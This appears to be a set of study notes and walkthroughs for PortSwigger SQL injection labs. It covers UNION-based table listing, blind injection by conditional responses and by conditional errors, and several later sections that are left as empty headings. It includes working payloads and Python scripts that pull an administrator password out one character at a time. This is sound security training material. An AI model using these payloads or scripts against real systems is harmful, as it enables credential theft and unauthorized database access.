This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

<details>
<summary>Lab details, screenshots & walkthrough 0.7</summary>

To solve the lab, display the database version string.

>Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Open labs 0.7](images/lab-0.7-database-version/open-labs-0.7.png)

![Click gift parameters](images/lab-0.7-database-version/gift-parameter-0.7.png)

![Open HTTP history send to repeater parameters Gifts request 0.7](images/lab-0.7-database-version/http-history-to-repeater-0.7.png)

![testing error 0.7](images/lab-0.7-database-version/error-0.7.png)

![comment error -- 0.7](images/lab-0.7-database-version/error-comment-0.7.png)

![success comment use operator --+ 0.7](images/lab-0.7-database-version/success-comment-0.7.png)

![try order by 1 0.7](images/lab-0.7-database-version/order-by-1-0.7.png)

![try order by 2 0.7](images/lab-0.7-database-version/order-by-2-0.7.png)

![success get error place columns values order by 3 0.7](images/lab-0.7-database-version/error-order-by-3.0.7.png)

![give a values UNION SELECT use NULL 0.7](images/lab-0.7-database-version/give-union-select-null-null-0.7.png)

![try columns input string a 'VULN' to try search in respone and frontend 0.7](images/lab-0.7-database-version/input-string-vuln-0.7.png)

![check version from cheatsheet sql injection 0.7](images/lab-0.7-database-version/cheatsheet-0.7.png)

![try input @@version values to check database version 0.7](images/lab-0.7-database-version/check-version-0.7.png)

##### Tutorial

1. Open browser and active proxy search parameters `Gifts` and then check history send to repeater a requetst.
2. Modify give a values `'` to see behaviour HTTP error 500.
3. Modify give a values comment `--` if error code 500 you can try add `--+` and send request have a comment success load code 200.
4. Modify send a values `ORDER BY` for search error.
5. If success get error value from testing `ORDER BY`:
```sql
' ORDER BY 1--+ 200 OK
' ORDER BY 2--+ 200 OK
' ORDER BY 3--+ 500 Internal server erorr
```
6. Try a values `UNION SELECT` use NULL and testing input string 'VULN' to try columns place.:
```SQL
' UNION SELECT NULL,NULL--+
' UNION SELECT 'VULN','VULN'--+
```
7. Last try to give a values to check number version database use `@@VERSION`.
```SQL
' UNION SELECT @@version,'VULN'--+
```
8. Cheatsheet can find `Database version for check information stack like a Oracle, Microsoft, PostgreSQL, MySQL. Link [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
```txt
| Database | Query |
| --- | --- |
| Oracle | `SELECT banner FROM v$version;` |
| Oracle | `SELECT version FROM v$instance;` |
| Microsoft SQL Server | `SELECT @@VERSION;` |
| PostgreSQL | `SELECT version();` |
| MySQL | `SELECT @@VERSION;` |
```

##### Reference

<details>
<summary> 18. SQL Injection: Querying the Database Type and Version on MySQL and Microsoft | PortSwigger Lab — Michael Sommer</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=7afmKPDaZtw
Purpose: In this episode, we take SQL injection beyond data extraction and use it to bypass authentication entirely. By intercepting a login request in Burp Suite and manipulating the username field, we get logged in as the administrator account — without ever knowing, or needing, the correct password.
</details>

<details>
<summary>19. SQL Injection - Lab #8 SQLi attack, querying the database type and version on MySQL & Microsoft — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=MFTk_LNRW0g
Purpose: This lab contains a SQL injection vulnerability in the product category field. To solve the lab, we perform a UNION based SQL injection attack that queries the database type and version on Microsoft and MySQL databases.

</details>

<details>
<summary> 20. SQL Injection Attack - Querying the Database Type and Version MySQL and Microsoft — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=4UxUpsCZQfI
Purpose: In this cyber security lab we run an SQL injection attack where we query the MYSQL version of the database running on the back end. 
</details>

</details>

#### Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

```sql
SELECT * FROM information_schema.tables
```
This returns output like the following:
```txt
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
This returns output like the following:

```txt
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
This output shows the columns in the specified table and the data type of each column.

##### Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

<details>
<summary>Lab details, screenshots & walkthrough 0.8</summary>

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

>Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Open labs 0.8](images/lab-0.8-database-contents/open-lab-0.8.png)

![Open parameter Gifts and active history 0.8](images/lab-0.8-database-contents/params-gift-active-proxy-0.8.png)

![send repeater 0.8](images/lab-0.8-database-contents/send-repeater-0.8.png)

![send repeater 0.8](images/lab-0.8-database-contents/send-repeater-0.8.png)

![test error 0.8](images/lab-0.8-database-contents/test-error-0.8.png)

![test comment 0.8](images/lab-0.8-database-contents/test-comment-0.8.png)

![test order by 1 0.8](images/lab-0.8-database-contents/test-order-by-1-0.8.png)

![test order by 2 0.8](images/lab-0.8-database-contents/test-order-by-2-0.8.png)

![error order by 3 0.8](images/lab-0.8-database-contents/error-order-by-3-0.8.png)

![test union select null null 0.8](images/lab-0.8-database-contents/test-union-null-0.8.png)

![test union select a b 0.8](images/lab-0.8-database-contents/test-union-string-0.8.png)

![test listing tables infromation schema 0.8](images/lab-0.8-database-contents/test-listing-tables-0.8.png)

![find users tables 0.8](images/lab-0.8-database-contents/find-users-tables-0.8.png)

![success find credentials columns 0.8](images/lab-0.8-database-contents/success-get-credential-columns-0.8.png)

![success credentials administrator 0.8](images/lab-0.8-database-contents/success-get-credential-administrator-0.8.png)

![verify user and password administrator 0.8](images/lab-0.8-database-contents/verify-credentials-0.8.png)

![success login user and password administrator 0.8](images/lab-0.8-database-contents/success-login-credentials-0.8.png)

##### Tutorial

1. Take a request from HTTP history and then send to repeater.
2. Input `'` to see error behaviour and get comment `--` for see success respone.
3. Try search error columns use `ORDER BY`
```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- get error columns
```
4. Determine the number of columns use `UNION SELECT`
```sql
' UNION SELECT NULL,NULL--
' UNION SELECT 'A','B'--
```
5. Use the following payload to retrieve the list of tables in the database
```sql
'+UNION SELECT table_name,+NULL FROM information_schema.tables--
```
6. find column name with name users table to get columns credentials.
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE+table_name='users_abcdf'--
```
7. Copy and paste credentials columns find `username` and `password` `administor` use columns credential and name users table.
```sql
' UNION SELECT username_abdcf,+password_abcdf FROM users_abcdf--
```
8. Login `username` and `password`
9. Correct success to login with account `administrator`

##### Reference

<details>
<summary> 21. List Database Content For Further Exploitation! — Intigriti</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=cC0_pFyvFtA 
Purpose: we are going to have a look at how to examine a database for table and columns that can be further used in a UNION payload.
</details>

<details>
<summary>22. SQL Injection - Lab #9 SQL injection attack, listing the database contents on non Oracle databases — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=JduM_dO8glw
Purpose: This lab contains a SQL injection vulnerability in the product category field. To solve the lab, we perform a UNION based SQL injection attack on a PostgreSQL database that retrieves the usernames and passwords of all users of the application.

</details>

<details>
<summary> 23. SQL Injection: Listing Database Contents on Non-Oracle Databases | PortSwigger (OLD) — Michael Sommer</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=Kd810Iiv1dM
Purpose: This episode is the payoff for everything we built up in the previous two labs. Once we've confirmed we're not dealing with Oracle, we use `information_schema` — a standardized, read-only metadata schema shared by MySQL, PostgreSQL, and Microsoft SQL Server — to walk the full path from a UNION-based SQL injection to a complete credential dump.

We enumerate the database's tables via `information_schema.tables`, narrow down to the columns of a specific table via `information_schema.columns`, and finally extract a working username and password directly through the injection. We close out the lab by logging in as `administrator` using the credentials we just pulled out of the database — no error messages needed at any point, just one consistent syntax that works identically across three of the most common database engines out there.

</details>

</details>

## Blind SQL injection

In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.

### What is blind SQL injection?

Blind SQL injection when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but diffrent techniques must be used.

### Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses cookies to gather analytics about usage. Requests to the application include a cookie header like this:
```txt
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave diffrently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behaviour is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggreing diffrent responses conditionally, depending on an injected condition.

#### Exploiting blind SQL injection by triggering conditional responses - Continued

To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values is turn:

```txt
…xyz' AND '1'='1
…xyz' AND '1'='2
```
- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value cause the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and user called `Administrator`. You can determine the password for this users by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

```sql
xyz ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
This does not returns the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater that `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confiriming that the first character of the password is `s`:

```sql
xyz ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
We cna continue this process to systematically determine the full password for the `Administrator` user.

>Notes: The `SUBSTRING` fuction is called `SUBSTR` On some types of database. For more details, see the SQL injection cheat sheet.

##### Lab: Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

<details>
<summary>Lab details, screenshots & walkthrough 0.9</summary>

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

>Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Open lab 0.9](images/lab-0.9-blind-conditional-responses/open-lab-0.9.png)

![Click My account 0.9](images/lab-0.9-blind-conditional-responses/go-my-login-0.9.png)

![Check history /login from my account for get request and send repeater 0.9](images/lab-0.9-blind-conditional-responses/send-repeater-0.9.png)

![In repeater see cookie parameter 0.9](images/lab-0.9-blind-conditional-responses/test-request-normal-0.9.png)

![Test single quote to see error blind welcome back 0.9](images/lab-0.9-blind-conditional-responses/test-single-quote-welcome-back-0.9.png)

![Test comment syntax 0.9](images/lab-0.9-blind-conditional-responses/test-comment-0.9.png)

![Verify users table 0.9](images/lab-0.9-blind-conditional-responses/verify-users-table-0.9.png)

![Test password length > 1 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-1-0.9.png)

![Test password length > 15 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-15-0.9.png)

![Test password length > 20 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-20-0.9.png)

![In password length result have a > 19 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-19-0.9.png)

![Substring extraction progress 0.9](images/lab-0.9-blind-conditional-responses/test-substring-progress-0.9.png)

![Python script 0.9](images/lab-0.9-blind-conditional-responses/python-script-0.9.png)

![Run python script 0.9](images/lab-0.9-blind-conditional-responses/run-python-script-0.9.png)

![Login as administrator 0.9](images/lab-0.9-blind-conditional-responses/login-administrator-0.9.png)

![Lab solved 0.9](images/lab-0.9-blind-conditional-responses/lab-solved-0.9.png)

##### Tutorial

1. Intercept the Login Request

   Open the lab page and intercept the `GET /login` request using Burp Suite. Once intercepted, send the request to Repeater for further testing.

2. Test for SQL Injection

   Check whether the `TrackingId` cookie parameter is vulnerable to SQL injection by appending a single quote (`'`) to its value:

   ```http
   TrackingId=7Itm5DEgpF70MXu9'
   ```

   If the `Welcome back!` message disappears after adding the single quote, it indicates that the input may be affecting the SQL query.

3. Determine the SQL Comment Syntax

   Append the SQL comment syntax `--+` to terminate the remaining part of the original query:

   ```http
   TrackingId=7Itm5DEgpF70MXu9'--+
   ```

   If the `Welcome back!` message reappears, it indicates that the injection is working and that `--+` successfully comments out the remaining SQL statement.

4. Verify the Existence of the `users` Table

   Test whether the `users` table exists using a static condition:

   ```sql
   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users LIMIT 1)='a'--+
   ```

   If the `Welcome back!` message appears, it indicates that the `users` table exists and that the injected SQL condition evaluates successfully.

5. Determine the Administrator Password Length

   Use the SQL `LENGTH()` function to determine the length of the administrator's password.

   Start with a relatively high number, then gradually decrease it until the condition evaluates to true:

   ```sql
   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--+

   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a'--+
   ```

   In this test, `LENGTH(password)>20` does not return the `Welcome back!` message, while `LENGTH(password)>19` does.

   Therefore, the administrator's password is 20 characters long.

6. Extract the Password Using `SUBSTRING()`

   Use the SQL `SUBSTRING()` function to test the password one character at a time.

   Change the first numeric argument to specify the character position and replace `'a'` with the character you want to test.

   For the first character:

   ```sql
   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--+
   ```

   For the second character:

   ```sql
   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--+
   ```

   If the `Welcome back!` message appears, the tested character matches the character at that position.

7. Repeat the Process for All 20 Characters

   Repeat step 6 for positions 1 through 20 until all characters of the administrator's password have been identified.

8. Automate the Extraction Process with Python

   To speed up the process, automate password extraction using the following Python script:

   ```python
   import requests
   import string

   # Set the target login URL
   url = "https://0a10003803f349cf80be26a5007c00d1.web-security-academy.net/login"

   # Define the required session cookies
   tracking_id = "7Itm5DEgpF70MXu9"
   session = "3mQEAdAHV0kDtdwEARtu43bCdwniet64"

   # Define possible password characters
   chars = string.ascii_lowercase + string.digits
   password = ""

   # Extract the password character by character
   for position in range(1, 21):
       for char in chars:

           # Inject a Boolean condition into the TrackingId cookie
           cookies = {
               "TrackingId": f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--+",
               "session": session
           }

           # Send the request and check the server response
           response = requests.get(url, cookies=cookies)

           # A matching character triggers the welcome message
           if "Welcome back!" in response.text:
               password += char
               print(f"[+] {position}: {char} -> {password}")
               break

   # Print the extracted password
   print(f"\nPassword: {password}")
   ```

9. Run the Python Script

   Install the required library:

   ```bash
   pip install requests
   ```

   Then execute the script:

   ```bash
   python blind-sql-injection-conditional-responses.py
   ```

10. Log in as the Administrator

    Once the script has extracted all 20 characters, log in using the following credentials:

    ```text
    Username: administrator
    Password: <extracted password>
    ```

11. Complete the Lab

    If the login is successful, you will gain access to the administrator account, and the lab will be marked as Solved.

<details>
<summary> 24. Blind SQL Injection - How Does It Work? — z3nshell</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=W3zvXK9i75A
Purpose: In this video we explain the concept of blind SQL injection and make use of the Burp Academy labs to provide an example of how this vulnerability is exploited. 
</details>

<details>
<summary>25. SQL Injection - Lab #11 Blind SQL injection with conditional responses — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=LBG_n9fr8sM
Purpose: This lab contains a blind SQL injection vulnerability. To solve the lab, we perform a blind based SQL injection attack on  the database that retrieves the password of the administrator user on the application.

</details>

</details>

## Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in te same way as the conditional responses we looked at in the previous section. For more information. see Exploiting blind SQL injection by triggering conditional errors.
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting senstivie data via verbose SQL error messages.

#### Exploiting blind SQL injection by triggering conditional errors

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting diffrenet boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

#### Exploiting blind SQL injection by triggering conditional errors - Continued

To see how this works, suppose that two request are sent containing the following `TrackingId` cookie values in turn:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

if the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1,1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
>Note: There are diffrent ways of triggering conditional erros, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.

##### Lab: Blind SQL injection with conditional errors

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

<details>
<summary>Lab details, screenshots & walkthrough 0.10</summary>

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows, if the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the labs, log in as the `administrator` user.

>Note: This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Access Lab 0.10](images/lab-0.10-blind-conditional-errors/01-access-lab-0.10.png)

![Open Pages 0.10](images/lab-0.10-blind-conditional-errors/02-open-pages-0.10.png)

![Activate Proxy 0.10](images/lab-0.10-blind-conditional-errors/03-activate-proxy-0.10.png)

![Check History and Send to Repeater 0.10](images/lab-0.10-blind-conditional-errors/04-send-request-to-repeater-0.10.png)

![Test SQL Injection with Single Quote 0.10](images/lab-0.10-blind-conditional-errors/05-test-single-quote-0.10.png)

![Test SQL Comment Syntax 0.10](images/lab-0.10-blind-conditional-errors/06-test-sql-comment-0.10.png)

![Test TRUE Condition 0.10](images/lab-0.10-blind-conditional-errors/07-test-true-condition-0.10.png)

![Test FALSE Condition 0.10](images/lab-0.10-blind-conditional-errors/08-test-false-condition-0.10.png)

![Password Length Greater Than 1 0.10](images/lab-0.10-blind-conditional-errors/09-password-length-greater-than-1-0.10.png)

![Password Length Greater Than 100 0.10](images/lab-0.10-blind-conditional-errors/10-password-length-greater-than-100-0.10.png)

![Password Length Enumeration Result 0.10](images/lab-0.10-blind-conditional-errors/11-password-length-result-0.10.png)

![Password Length Enumeration Script 0.10](images/lab-0.10-blind-conditional-errors/12-password-length-enumeration-script-0.10.png)

![Test Password with SUBSTR 0.10](images/lab-0.10-blind-conditional-errors/13-test-substring-password-0.10.png)

![Password Character Enumeration Script 0.10](images/lab-0.10-blind-conditional-errors/14-password-character-enumeration-script-0.10.png)

![Administrator Password Extracted 0.10](images/lab-0.10-blind-conditional-errors/15-administrator-password-extracted-0.10.png)

![Administrator Login 0.10](images/lab-0.10-blind-conditional-errors/16-administrator-login-0.10.png)

![Login Success 0.10](images/lab-0.10-blind-conditional-errors/17-login-success-0.10.png)

##### Tutorial

1. Access the target website, intercept an HTTP request, and send it to Burp Suite Repeater.

2. Insert a single quote (`'`) into the `TrackingId` cookie to check the server response and identify possible SQL errors. Then, try adding a SQL comment (`--`) to restore the normal response.

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5'
Cookie: TrackingId=cf0TIM6uE9oXtwj5'--
```

3. Test conditional error behavior using `CASE` and `TO_CHAR` to determine TRUE and FALSE conditions.

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--

Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
```

Expected responses:

- `1=2`: HTTP 200 (normal response).
- `1=1`: HTTP 500 (conditional error).

4. Test the target user in the `users` table and check the administrator password length using `LENGTH()`.

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--

Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 100 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

Expected behavior:

- `LENGTH(password) > 1`: HTTP 500 if the password is longer than 1 character.
- `LENGTH(password) > 100`: HTTP 200 if the password is 100 characters or shorter.

For manual testing, narrow down the password length:

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 19 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--

Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

If `>19` returns HTTP 500 and `>20` returns HTTP 200, the password length is 20 characters.

5. Automate password length detection using Python scripting.

```python
import requests

# Set the target URL
url = "https://0aef008f04667a9c83ee831e004800e8.web-security-academy.net/"

# Define session cookies
tracking_id = "cf0TIM6uE9oXtwj5"
session = "CN3T8AJ1GDQhTbXSNaVdhu020gESmoic"

# Detect password length
for length in range(1, 31):

    # Inject conditional error into TrackingId
    cookies = {
        "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN LENGTH(password) > {length} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--",
        "session": session
    }

    # Send request and check HTTP response
    response = requests.get(url, cookies=cookies)

    # HTTP 500 indicates condition TRUE
    if response.status_code == 500:
        print(f"[+] Length > {length}: TRUE")

    # HTTP 200 indicates condition FALSE
    else:
        print(f"[+] Password length: {length}")
        break
```

6. After identifying the password length, use `SUBSTR()` to test individual password characters. Try alphanumeric characters (`A-Z`, `a-z`, `0-9`).

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--

Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) = '8' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

Expected behavior:

- Character `a`: HTTP 200 if it does not match.
- Character `8`: HTTP 500 if it matches.

7. Automate password character enumeration using Python scripting.

```python
import requests
import string

# Set the target URL
url = "https://0aef008f04667a9c83ee831e004800e8.web-security-academy.net/"

# Define session cookies
tracking_id = "cf0TIM6uE9oXtwj5"
session = "CN3T8AJ1GDQhTbXSNaVdhu020gESmoic"

# Define possible password characters
chars = string.ascii_letters + string.digits
password = ""

# Extract password character by character
for position in range(1, 21):
    for char in chars:

        # Inject SUBSTR condition into TrackingId
        cookies = {
            "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--",
            "session": session
        }

        # Send request and check HTTP response
        response = requests.get(url, cookies=cookies)

        # HTTP 500 indicates matching character
        if response.status_code == 500:
            password += char
            print(f"[+] {position}: {char} -> {password}")
            break

# Print extracted password
print(f"\nPassword: {password}")
```

8. Run the Python script to extract the password character by character. The script tests all 20 positions and identifies matching characters through HTTP 500 responses.

9. Log in using the extracted credentials:

- Username: `administrator`
- Password: extracted password

10. Verify successful authentication. The lab should now be marked as solved.

<details>
<summary> 26. Blind SQL Injection With Conditional Errors - Administrator Password Stolen — z3nshell</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=HjXUtCKm1FM
Purpose: In this tutorial we demonstrate a blind SQL injection attack making use of 'conditional errors'. This is where we provoke the SQL server to leak information by forcing errors when SQL queries are matched.
</details>

<details>
<summary>27. SQL Injection - Lab #12 - Blind SQL injection with conditional errors — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=_7w-KEP_K5w
Purpose: In this video, we cover Lab #12 in the SQL injection track of the Web Security Academy. This lab contains a blind SQL injection vulnerability. To solve the lab, we perform a blind based SQL injection attack on  the database that retrieves the password of the administrator user on the application.
</details>

<details>
<summary>28. Blind SQL injection with conditional errors (Video solution, Audio) — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=HbaD3maRucc
Purpose: This video shows the lab solution of "Blind SQL injection with conditional errors" from Web Security Academy (Portswigger)
</details>

</details>

#### Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter.

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```
This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quote string inside a `WHERE` statment. This makes it easier to construct a valid query containing a malicious payload.

Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

#### Extracting sensitive data via verbose SQL error messages - Continued

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visble one.

You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```
Often, the data that you're trying to read is a string. Attemping to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:

```sql
ERROR: invalid input syntax for type integer: "Example data"
```
This type of query may also be useful if a character limit prevents you from triggering conditional responses.

##### Lab: Visible error-based SQL injection



#### Exploiting blind SQL injection by triggering time delays

#### Exploiting blind SQL injection by triggering time delays - Continued
##### Lab: Blind SQL injection with time delays and information retrieval


#### Exploiting blind SQL injection using out-of-band (OAST) techniques

#### Exploiting blind SQL injection using out-of-band (OAST) techniques - Continued
##### Lab: Blind SQL injection with out-of-band interaction
##### Lab: Blind SQL injection with out-of-band data exfiltration

## SQL injection in different contexts

#### Lab: SQL injection with filter bypass via XML encoding

## Second-order SQL injection

## How to prevent SQL injection

### How to prevent SQL injection - Continued